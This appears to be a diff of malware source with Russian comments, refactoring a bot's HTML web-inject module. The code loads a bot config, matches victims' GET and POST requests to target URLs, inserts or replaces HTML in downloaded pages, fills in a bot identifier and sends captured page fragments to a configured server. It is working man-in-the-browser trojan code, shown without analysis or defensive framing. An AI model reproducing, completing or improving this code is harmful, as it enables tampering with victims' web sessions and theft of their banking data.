@@ -76,26 +76,16 @@ DWORD TimeOut = 70;
 // ----------------------------------------------------------------------------
 
 
-void HTMLInjectSetVariableValue(PHTMLInjectData Data, const char* Variable, const char* Value)
+void HTMLInjectSetVariableValue(THTMLInjectData *Data, const char* Variable, const char* Value)
 {
 	// Функция заменяет знасение переменной
-	PCHAR Temp = NULL;
-
-	#define __Replace(Str) if (Temp != NULL) {STR::Free2(Str); Str = Temp;}
-
-	// Меняем переменные во всех блоках
-	Temp = STR::Replace(Data->Before, (PCHAR)Variable, (PCHAR)Value);
-	__Replace(Data->Before);
-
-	Temp = STR::Replace(Data->Inject, (PCHAR)Variable, (PCHAR)Value);
-	__Replace(Data->Inject);
-
-	Temp  = STR::Replace(Data->After, (PCHAR)Variable, (PCHAR)Value);
-	__Replace(Data->After);
+	Data->Before.Replace(Variable, Value);
+	Data->Inject.Replace(Variable, Value);
+	Data->After.Replace(Variable, Value);
 }
 
 
-void HTMLInjectSetSystemVariables(PHTMLInjectData Data)
+void HTMLInjectSetSystemVariables(THTMLInjectData *Data)
 {
 	// Функция меняет идендификатор бота на его значение
 
@@ -133,6 +123,21 @@ PCHAR ReadStrBlock_(PCHAR &Buf)
 	Buf += Size;
 	return Str;
 }
+
+void ReadStrBlock_(PCHAR &Buf, string &Out)
+{
+	// Функция читаем строку из буфера и смещает указатель за строку
+	// формат буфера (DWORD - Длина строки)(Строка)
+	DWORD Size = *(DWORD*)Buf;
+	Buf += sizeof(DWORD);
+	if (Size == 0) return;
+
+	Out.Copy(Buf, 0, Size);
+
+	Buf += Size;
+}
+
+
 
 bool DoLoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
 {
@@ -225,14 +230,14 @@ bool DoLoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
 	Buf++;
 
 	// ------------- Загружаем данные инжектов -------------//
-	PHTMLInject Inject;
-	PHTMLInjectData Data;
+	THTMLInject *Inject;
+	THTMLInjectData *Data;
 	DWORD DataCount;
 	DWORD Mode;
 
 	for (DWORD i = 0; i < Count; i++)
 	{
-		Inject = HTMLInjects::AddInject(BotConfig->HTMLInjects, NULL);
+		Inject = Config->HTMLInjects->AddInject();
 		if (Inject == NULL)
 			break;
 
@@ -255,18 +260,23 @@ bool DoLoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
 
 		for (DWORD j = 0; j < DataCount; j++)
 		{
-			Data = HTMLInjects::AddInjectData(Inject, NULL, NULL, NULL);
+			Data = Inject->AddData();
 			if (Data == NULL)
 				break;
 
 			ID++;
 			Data->ID = ID;
-			Data->Before = ReadStrBlock_(Buf);
-			Data->Inject = ReadStrBlock_(Buf);
-			Data->After = ReadStrBlock_(Buf);
+			ReadStrBlock_(Buf, Data->Before);
+			ReadStrBlock_(Buf, Data->Inject);
+			ReadStrBlock_(Buf, Data->After);
 
-			if (!STR::IsEmpty(Data->Before))
-				Data->MacrosHash = CalcHash(Data->Before);
+//			Data->Before = ReadStrBlock_(Buf);
+//			Data->Inject = ReadStrBlock_(Buf);
+//			Data->After = ReadStrBlock_(Buf);
+
+			if (!Data->Before.IsEmpty())
+				Data->MacrosHash = Data->Before.Hash();
+				;
 
 			// В рабочем боте подменяем переменные в момент загрузки конфига
 			#ifndef BV_APP
@@ -358,30 +368,27 @@ void CheckConfigUpdates(PBotConfig Config)
 void FreeHTMLInjectData(LPVOID Data)
 {
 	// Уничтожить данные HTML инжекта
-	PHTMLInjectData D = (PHTMLInjectData)Data;
-	STR::Free(D->Before);
-	STR::Free(D->After);
-	STR::Free(D->Inject);
-	FreeStruct(D);
+	delete (THTMLInjectData*)Data;
 }
 
-void HTMLInjects::FreeInject(PHTMLInject Inject) {
+void HTMLInjects::FreeInject(THTMLInject *Inject)
+{
 	if (Inject == NULL)
 		return;
 
-	if (Inject->RefCount > 0) {
+	if (Inject->RefCount > 0)
+	{
 		Inject->DestroyAfterRelease = true;
 		return;
 	}
 
-	STR::Free(Inject->URL);
-	if (Inject->Injects != NULL)
-		List::Free(Inject->Injects);
-	FreeStruct(Inject);
+	delete Inject;
 }
 
+
 // ----------------------------------------------------------------------------
-void HTMLInjects::ReleaseInjectsList(PList List) {
+void HTMLInjects::ReleaseInjectsList(PList List)
+{
 	// Фуекция освобождает список инжектов
 	// которые были выделены для запроса
 	if (List == NULL)
@@ -397,7 +404,7 @@ void HTMLInjects::ReleaseInjectsList(PList List) {
 
 	for (DWORD i = 0; i < List::Count(List); i++)
 	{
-		PHTMLInject Inject = (PHTMLInject)List::GetItem(List, i);
+		THTMLInject *Inject = (THTMLInject*)List::GetItem(List, i);
 		if (Inject->RefCount > 0)
 			Inject->RefCount--;
 		if (Inject->RefCount == 0 && Inject->DestroyAfterRelease)
@@ -411,19 +418,13 @@ void HTMLInjects::ReleaseInjectsList(PList List) {
 }
 
 // ----------------------------------------------------------------------------
-PList CreateHTMLInjectsList() {
-	PList List = List::Create();
-	List::SetFreeItemMehod(List, (TFreeItemMethod)HTMLInjects::FreeInject);
-	return List;
-}
-// ----------------------------------------------------------------------------
 
 PBotConfig Config::Create()
 {
 	PBotConfig C = CreateStruct(TBotConfig);
 	if (C == NULL)
 		return NULL;
-	C->HTMLInjects = CreateHTMLInjectsList();
+	C->HTMLInjects = new THTMLInjectList();
 	pInitializeCriticalSection(&C->Lock);
 	return C;
 }
@@ -442,83 +443,83 @@ void Config::Free(PBotConfig Cfg)
 
 // ----------------------------------------------------------------------------
 
-PHTMLInject HTMLInjects::AddInject(PList List, PHTMLInject Source,
-	bool IgnoreDisabledData) {
-	// Добавить новый HTML инжект в список
-	// List. Если указан источник Source то в новый
-	// будут скопированы все его данные
-
-	PHTMLInject Inject = CreateStruct(THTMLInject);
-	if (Inject == NULL)
-		return NULL;
-
-	// Копируем инжект
-	if (Source != NULL) {
-		Inject->URL = STR::New(Source->URL);
-		Inject->GET = Source->GET;
-		Inject->POST = Source->POST;
-		Inject->IsLog = Source->IsLog;
-
-		// копируем данные инжектов
-		if (Source->Injects != NULL) {
-			DWORD Count = List::Count(Source->Injects);
-			for (DWORD i = 0; i < Count; i++) {
-				PHTMLInjectData Data = (PHTMLInjectData)List::GetItem
-					(Source->Injects, i);
-				if (!Data->Disabled || !IgnoreDisabledData)
-					HTMLInjects::AddInjectData
-						(Inject, Data->Before, Data->After, Data->Inject);
-			}
-		}
-	}
-
-	if (List != NULL)
-		List::Add(List, Inject);
-	return Inject;
-}
+//PHTMLInject HTMLInjects::AddInject(PList List, PHTMLInject Source,
+//	bool IgnoreDisabledData) {
+//	// Добавить новый HTML инжект в список
+//	// List. Если указан источник Source то в новый
+//	// будут скопированы все его данные
+//
+//	PHTMLInject Inject = CreateStruct(THTMLInject);
+//	if (Inject == NULL)
+//		return NULL;
+//
+//	// Копируем инжект
+//	if (Source != NULL) {
+//		Inject->URL = STR::New(Source->URL);
+//		Inject->GET = Source->GET;
+//		Inject->POST = Source->POST;
+//		Inject->IsLog = Source->IsLog;
+//
+//		// копируем данные инжектов
+//		if (Source->Injects != NULL) {
+//			DWORD Count = List::Count(Source->Injects);
+//			for (DWORD i = 0; i < Count; i++) {
+//				PHTMLInjectData Data = (PHTMLInjectData)List::GetItem
+//					(Source->Injects, i);
+//				if (!Data->Disabled || !IgnoreDisabledData)
+//					HTMLInjects::AddInjectData
+//						(Inject, Data->Before, Data->After, Data->Inject);
+//			}
+//		}
+//	}
+//
+//	if (List != NULL)
+//		List::Add(List, Inject);
+//	return Inject;
+//}
 // ----------------------------------------------------------------------------
 
-void HTMLInjects::ResetStatus(PList Injects)
-{
-	// сбросить статус инжектов
-	for (DWORD i = 0; i < List::Count(Injects); i++)
-	{
-		PHTMLInject Inject = (PHTMLInject)List::GetItem(Injects, i);
-		Inject->Used = false;
-		for (DWORD j = 0; j < List::Count(Inject->Injects); j++)
-		{
-			PHTMLInjectData Data = (PHTMLInjectData)List::GetItem
-				(Inject->Injects, j);
-			Data->State = idsUnknown;
-		}
-	}
-}
+//void HTMLInjects::ResetStatus(PList Injects)
+//{
+//	// сбросить статус инжектов
+//	for (DWORD i = 0; i < List::Count(Injects); i++)
+//	{
+//		PHTMLInject Inject = (PHTMLInject)List::GetItem(Injects, i);
+//		Inject->Used = false;
+//		for (DWORD j = 0; j < List::Count(Inject->Injects); j++)
+//		{
+//			PHTMLInjectData Data = (PHTMLInjectData)List::GetItem
+//				(Inject->Injects, j);
+//			Data->State = idsUnknown;
+//		}
+//	}
+//}
 // ----------------------------------------------------------------------------
 
-PHTMLInjectData HTMLInjects::AddInjectData
-	(PHTMLInject HTMLInject, PCHAR Before, PCHAR After, PCHAR Inject) {
-	// AddHTMLInjectData - Добавить новые данные инжекта
-	if (HTMLInject == NULL)
-		return NULL;
-
-	PHTMLInjectData Data = CreateStruct(THTMLInjectData);
-	if (Data == NULL)
-		return NULL;
-
-	Data->Before = STR::New(Before);
-	Data->After = STR::New(After);
-	Data->Inject = STR::New(Inject);
-
-	if (HTMLInject->Injects == NULL) {
-		HTMLInject->Injects = List::Create();
-		List::SetFreeItemMehod(HTMLInject->Injects, FreeHTMLInjectData);
-	}
-
-	List::Add(HTMLInject->Injects, Data);
-	Data->Owner = HTMLInject;
-
-	return Data;
-}
+//PHTMLInjectData HTMLInjects::AddInjectData
+//	(PHTMLInject HTMLInject, PCHAR Before, PCHAR After, PCHAR Inject) {
+//	// AddHTMLInjectData - Добавить новые данные инжекта
+//	if (HTMLInject == NULL)
+//		return NULL;
+//
+//	PHTMLInjectData Data = CreateStruct(THTMLInjectData);
+//	if (Data == NULL)
+//		return NULL;
+//
+//	Data->Before = STR::New(Before);
+//	Data->After = STR::New(After);
+//	Data->Inject = STR::New(Inject);
+//
+//	if (HTMLInject->Injects == NULL) {
+//		HTMLInject->Injects = List::Create();
+//		List::SetFreeItemMehod(HTMLInject->Injects, FreeHTMLInjectData);
+//	}
+//
+//	List::Add(HTMLInject->Injects, Data);
+//	Data->Owner = HTMLInject;
+//
+//	return Data;
+//}
 // ----------------------------------------------------------------------------
 
 void HTMLInjects::ClearInjectList(PList List) {
@@ -547,10 +548,11 @@ bool ConfigDoGetInjectsForRequest(PBotConfig BotConfig, PRequest Request) {
 	}
 
 	// Проверяем инжекты
-	DWORD Count = List::Count(BotConfig->HTMLInjects);
-	for (DWORD i = 0; i < Count; i++) {
-		PHTMLInject Inject = (PHTMLInject)List::GetItem
-			(BotConfig->HTMLInjects, i);
+	DWORD Count = BotConfig->HTMLInjects->Count();
+	for (DWORD i = 0; i < Count; i++)
+	{
+		THTMLInject *Inject = BotConfig->HTMLInjects->Items(i);
+
 
 		if (Inject->Disabled)
 			continue;
@@ -558,7 +560,7 @@ bool ConfigDoGetInjectsForRequest(PBotConfig BotConfig, PRequest Request) {
 		// Сравниваем методы и ссылки
 		if ((Request->Method == hmGET && Inject->GET) ||
 			(Request->Method == hmPOST && Inject->POST))
-			if (CompareUrl(Inject->URL, URL))
+			if (CompareUrl(Inject->URL.t_str(), URL))
 			{
 				Inject->Used = true;
 
@@ -614,12 +616,11 @@ bool Config::IsInjectURL(PCHAR URL, THTTPMethod Method)
 	if (STR::IsEmpty(URL))
 		return false;
 
-	DWORD Count = List::Count(BotConfig->HTMLInjects);
+	DWORD Count = BotConfig->HTMLInjects->Count();
 
 	for (DWORD i = 0; i < Count; i++)
 	{
-		PHTMLInject Inject = (PHTMLInject)List::GetItem
-			(BotConfig->HTMLInjects, i);
+		THTMLInject *Inject = BotConfig->HTMLInjects->Items(i);
 
 		if (Inject->Disabled)
 			continue;
@@ -627,7 +628,7 @@ bool Config::IsInjectURL(PCHAR URL, THTTPMethod Method)
 		// Сравниваем методы и ссылки
 		if ((Method == hmGET && Inject->GET) ||
 			(Method == hmPOST && Inject->POST))
-			if (CompareUrl(Inject->URL, URL))
+			if (CompareUrl(Inject->URL.t_str(), URL))
 			{
 				return true;
 			}
@@ -816,21 +817,6 @@ void Config::Clear(PBotConfig Config)
 }
 // ----------------------------------------------------------------------------
 
-bool HTMLInjects::IsValidInjectData(PHTMLInjectData Data) {
-	// Функция возвращает истину если данные поддерживаются
-	// методом инжекта
-	if (Data == NULL)
-		return false;
-
-	bool B = !STR::IsEmpty(Data->Before);
-	bool I = !STR::IsEmpty(Data->Inject);
-	bool A = !STR::IsEmpty(Data->After);
-
-	return(B && I && A) || (B && A) || (B && I) || (I && A);
-
-}
-// ----------------------------------------------------------------------------
-
 bool SubstitudeText2(PCHAR Buffer, PCHAR &NewBuffer, PCHAR Before,
 	PCHAR Inject, PCHAR After, DWORD &NewBufLen) {
 	// Функция вставляет текст Inject между текстом Before и After
@@ -907,7 +893,8 @@ bool SubstitudeText2(PCHAR Buffer, PCHAR &NewBuffer, PCHAR Before,
 }
 // ----------------------------------------------------------------------------
 
-PCHAR GetHTMLLogCode(PCHAR Buffer, PHTMLInject Inject) {
+PCHAR GetHTMLLogCode(PCHAR Buffer, THTMLInject *Inject)
+{
 	// Функция возвращает HTML код согласно настроек инжекта
 	if (STR::IsEmpty(Buffer) || Inject == NULL)
 		return NULL;
@@ -916,17 +903,20 @@ PCHAR GetHTMLLogCode(PCHAR Buffer, PHTMLInject Inject) {
 	bool Added = false;
 	PCHAR Code;
 	PCHAR Tmp;
-	DWORD Count = List::Count(Inject->Injects);
-	PHTMLInjectData Data;
+	DWORD Count = Inject->Count();
+	THTMLInjectData *Data;
 
-	for (DWORD i = 0; i < Count; i++) {
-		Data = (PHTMLInjectData)List::GetItem(Inject->Injects, i);
-		Code = GetTextBetween(Buffer, Data->Before, Data->After);
-		if (Code != NULL) {
+	for (DWORD i = 0; i < Count; i++)
+	{
+		Data = Inject->Items(i);
+		Code = GetTextBetween(Buffer, Data->Before.t_str(), Data->After.t_str());
+		if (Code != NULL)
+		{
 			Added = true;
-			if (!STR::IsEmpty(Data->Inject)) {
+			if (!Data->Inject.IsEmpty())
+			{
 				Tmp = Code;
-				Code = STR::New(3, Data->Inject, ": ", Tmp);
+				Code = STR::New(3, Data->Inject.t_str(), ": ", Tmp);
 				STR::Free(Tmp);
 			}
 			Strings::Add(S, Code, false);
@@ -952,8 +942,8 @@ PCHAR GetHTMLLogCode(PCHAR Buffer, PHTMLInject Inject) {
 
 // ----------------------------------------------------------------------------
 
-bool SendHTMLLogToServer(PCHAR Buffer, PHTMLInject Inject,
-	PHTTPSessionInfo Session) {
+bool SendHTMLLogToServer(PCHAR Buffer, THTMLInject *Inject, PHTTPSessionInfo Session)
+{
 	// Функция отправляет блоки HTML на указанный в настройках сервер
 	if (Inject == NULL || !Inject->IsLog)
 		return false;
@@ -996,22 +986,8 @@ bool SendHTMLLogToServer(PCHAR Buffer, PHTMLInject Inject,
 
 // ----------------------------------------------------------------------------
 
-PHTMLInjectData HTMLInjectCloneData(PHTMLInjectData Data)
+bool InjectHTMLCode(PRequest Request, THTMLInject *Inject)
 {
-	// Функция клонирует данные HTML инжекта
-	PHTMLInjectData R = CreateStruct(THTMLInjectData);
-	if (R != NULL)
-	{
-		CopyStruct(Data, R);
-		R->Before = STR::New(Data->Before);
-		R->Inject = STR::New(Data->Inject);
-		R->After  = STR::New(Data->After);
-	}
-	return R;
-}
-// ----------------------------------------------------------------------------
-
-bool InjectHTMLCode(PRequest Request, PHTMLInject Inject) {
 	// Метод обрабатывает загруженный HTML документ
 	if (Request == NULL || Inject == NULL)
 		return false;
@@ -1019,26 +995,24 @@ bool InjectHTMLCode(PRequest Request, PHTMLInject Inject) {
 	PCHAR NewBuffer = NULL;
 	DWORD NewLen = 0;
 
-	DWORD Count = List::Count(Inject->Injects);
+	DWORD Count = Inject->Count();
 	bool Injected; // Признак того, что был произведён хотя-бы один инжект
 
 	PCHAR BotID = GenerateBotID();
 
 	for (DWORD i = 0; i < Count; i++)
 	{
-		PHTMLInjectData SourceData = (PHTMLInjectData)List::GetItem(Inject->Injects, i);
-
-        PHTMLInjectData Data = SourceData;
+		THTMLInjectData *SourceData = Inject->Items(i);
 
 		// Отключенные данные игнорируем
-		if (Data->Disabled) continue;
+		if (SourceData->Disabled) continue;
+
+		// Перед инжектом копируем данные, т.к. некоторые
+		// инжекты могут содержать макросы подмены
+		THTMLInjectData *Data = new THTMLInjectData(NULL);
+		Data->Copy(*SourceData);
 
 		#ifdef BV_APP
-			// В в изуальном редакторе клонируем данные на случай
-			// если в исходных кодах инжектов будут системмные переенные
-			Data = HTMLInjectCloneData(SourceData);
-			if (Data == NULL) continue;
-
 			// Заменяем системмные переменные
 			HTMLInjectSetSystemVariables(Data);
 		#endif
@@ -1050,7 +1024,7 @@ bool InjectHTMLCode(PRequest Request, PHTMLInject Inject) {
 
 		if (Data->MacrosHash == 0)
 		{
-			Data->MacrosHash = CalcHash(Data->Before);
+			Data->MacrosHash = Data->Before.Hash();
 			SourceData->MacrosHash = Data->MacrosHash;
         }
 
@@ -1058,8 +1032,8 @@ bool InjectHTMLCode(PRequest Request, PHTMLInject Inject) {
 		{
 			// Заменяем всё содержимое документа
 			Injected = true;
-			NewBuffer = Data->Inject;
-            NewLen = StrCalcLength(NewBuffer);
+			NewBuffer = Data->Inject.t_str();
+            NewLen    = Data->Inject.Length();
 		}
 		else
 		// Инжектим HTML код в документ
@@ -1067,31 +1041,19 @@ bool InjectHTMLCode(PRequest Request, PHTMLInject Inject) {
 			// Перед инжектом проверем не является ли строка
 			// строкой в линукс формате
 
-			PCHAR Before = Data->Before;
-			PCHAR After  = Data->After;
-			PCHAR Inject = Data->Inject;
-
 			bool IsLinuxStr = STR::IsLinuxStr((PCHAR)Request->Buffer);
 			if (IsLinuxStr)
 			{
-				Before = STR::ConvertToLinuxFormat(Before);
-				After = STR::ConvertToLinuxFormat(After);
-				Inject = STR::ConvertToLinuxFormat(Inject);
+				Data->Before.ConvertToLinuzFormat();
+				Data->Inject.ConvertToLinuzFormat();
+				Data->After.ConvertToLinuzFormat();
 			}
 
 			// Выполняем подмену текста
-			if (SubstitudeText2((PCHAR)Request->Buffer, NewBuffer, Before,
-					Inject, After, NewLen))
+			if (SubstitudeText2((PCHAR)Request->Buffer, NewBuffer, Data->Before.t_str(),
+					Data->Inject.t_str(), Data->After.t_str(), NewLen))
 			{
 				Injected = true;
-			}
-
-			// Освобождаем данные
-			if (IsLinuxStr)
-			{
-				STR::Free(Before);
-				STR::Free(After);
-				STR::Free(Inject);
 			}
         }
 
@@ -1113,10 +1075,7 @@ bool InjectHTMLCode(PRequest Request, PHTMLInject Inject) {
 		}
 
 
-		#ifdef BV_APP
-        	// уничтожаем клонированные данные
-        	FreeHTMLInjectData(Data);
-		#endif
+		delete Data;
 	}
 
 	STR::Free(BotID);
@@ -1139,12 +1098,12 @@ bool HTMLInjects::Execute(PRequest Request, PHTTPSessionInfo Session) {
 	Request->Injected = true; // Устанавливаем признак обработанных инжектов
 
 	bool Result = false;
-	PHTMLInject Inject;
+	THTMLInject *Inject;
 	PCHAR NewBuffer;
 	DWORD Count = List::Count(Request->Injects);
 
 	for (DWORD i = 0; i < Count; i++) {
-		Inject = (PHTMLInject)List::GetItem(Request->Injects, i);
+		Inject = (THTMLInject*)List::GetItem(Request->Injects, i);
 		if (Inject->IsLog)
 			SendHTMLLogToServer((PCHAR)Request->Buffer, Inject, Session);
 		else {
@@ -1200,3 +1159,105 @@ bool HTMLInjects::SupportContentType(PCHAR CType) {
 	return Result;
 }
 // ----------------------------------------------------------------------------
+
+
+//*****************************************************************************
+//                              THTMLInjectList
+//*****************************************************************************
+
+THTMLInjectList::THTMLInjectList()
+{
+	FInjects = List::Create();
+}
+
+THTMLInjectList::~THTMLInjectList()
+{
+	List::Free(FInjects);
+}
+
+THTMLInject* THTMLInjectList::AddInject()
+{
+	// Функция добавляет новый инжект
+    return new THTMLInject(this);
+}
+
+void THTMLInjectList::ResetInjectsStatus()
+{
+	int C = Count();
+	for (int i = 0; i < C; i++)
+	{
+		THTMLInject *Inject = Items(i);
+		int DC = Inject->Count();
+		for (int j = 0; j < DC; j++)
+		{
+            Inject->Items(j)->State = idsUnknown;
+		}
+	}
+}
+
+//*****************************************************************************
+//                              THTMLInject
+//*****************************************************************************
+
+
+THTMLInject::THTMLInject(THTMLInjectList *aOwner)
+{
+	FOwner = aOwner;
+	if (FOwner)
+		List::Add(FOwner->FInjects, this);
+	FInjects = List::Create();
+}
+
+THTMLInject::~THTMLInject()
+{
+	if (FOwner)
+		List::Remove(FOwner->FInjects, this);
+	List::Free(FInjects);
+}
+
+THTMLInjectData* THTMLInject::AddData()
+{
+	return new THTMLInjectData(this);
+}
+
+//*****************************************************************************
+//                              THTMLInjectData
+//*****************************************************************************
+
+THTMLInjectData::THTMLInjectData(THTMLInject *aOwner)
+{
+	FOwner = aOwner;
+	if (FOwner)
+		List::Add(FOwner->FInjects, this);
+}
+
+THTMLInjectData::~THTMLInjectData()
+{
+	if (FOwner)
+		List::Remove(FOwner->FInjects, this);
+}
+
+
+void THTMLInjectData::Copy(const THTMLInjectData &Data)
+{
+	// Функция копирует данные
+	Before = Data.Before;
+	Inject = Data.Inject;
+	After  = Data.After;
+	State  = Data.State;
+	MacrosHash = Data.MacrosHash;
+	Disabled = Data.Disabled;
+}
+
+
+bool THTMLInjectData::IsValid()
+{
+	// Функция возвращает истину если данные можно использовать
+	// в инжектах
+	bool B = !Before.IsEmpty();
+	bool I = !Inject.IsEmpty();
+	bool A = !After.IsEmpty();
+
+	return(B && I && A) || (B && A) || (B && I) || (I && A);
+
+}
